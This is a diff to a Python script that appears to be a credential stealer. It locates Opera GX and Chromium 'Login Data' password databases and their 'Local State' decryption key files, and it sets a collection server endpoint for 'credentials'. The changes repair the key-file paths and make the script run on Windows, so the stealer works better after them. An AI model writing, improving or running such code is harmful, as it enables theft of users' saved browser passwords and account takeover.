@@ -1,7 +1,7 @@
 import io
 import os
 import sys
-import pwd
+#import pwd
 import requests
 import platform
 from zipfile import ZipFile
@@ -96,16 +96,15 @@ def gather_opera_files() -> None:
     common_path = os.path.join(USERPROFILE, "appdata/roaming/Opera Software/Opera GX Stable")
 
     login_file_name = "Login Data"
-    key_file_name = "key4.db"
+    key_file_name = "Local State"
 
     try:
-        directory_files = os.listdir(common_path)
-        for file_name in directory_files:
-            login_file_path = os.path.join(common_path, file_name, login_file_name)
-            key_file_path = os.path.join(common_path, file_name, key_file_name)
+     
+        login_file_path = os.path.join(common_path, login_file_name)
+        key_file_path = os.path.join(common_path, key_file_name)
 
-            if os.path.exists(login_file_path):
-                file_gathering(login_file_path, key_file_path, login_file_name, key_file_name, "opera")
+        if os.path.exists(login_file_path):
+            file_gathering(login_file_path, key_file_path, login_file_name, key_file_name, "opera")
     except Exception as e:
         print(f"Error in gather_opera_files: {e}")
 
@@ -126,12 +125,12 @@ def gather_chromium_files(browser: str, browser_name: str) -> None:
             if check_os() == LINUX_OS:
                 key_file_path = os.path.join(common_path, key_file_name)
             else:
-                key_file_path = os.path.join(common_path, file_name, key_file_name)
-
+                key_file_path = os.path.join(common_path, key_file_name)
+            
             if os.path.exists(login_file_path):
                 file_gathering(login_file_path, key_file_path, login_file_name, key_file_name, browser_name)
     except Exception as e:
-        print(f"Error in gather_opera_files: {e}")
+        print(f"Error in gather_chromium_files: {e}")
 
 def main() -> int:
     # print(f"OS Type: {check_os()}")
@@ -166,10 +165,10 @@ def main() -> int:
     return 0
 
 if __name__ == '__main__':
-    if check_os() == LINUX_OS:
-        USERPROFILE = pwd.getpwuid(os.getuid())[0]
-    else:
-        USERPROFILE = os.environ['USERPROFILE']
+    #if check_os() == LINUX_OS:
+        #USERPROFILE = pwd.getpwuid(os.getuid())[0]
+    #else:
+    USERPROFILE = os.environ['USERPROFILE']
 
     SERVER = "http://127.0.0.1:5000/credentials"
     sys.exit(main())
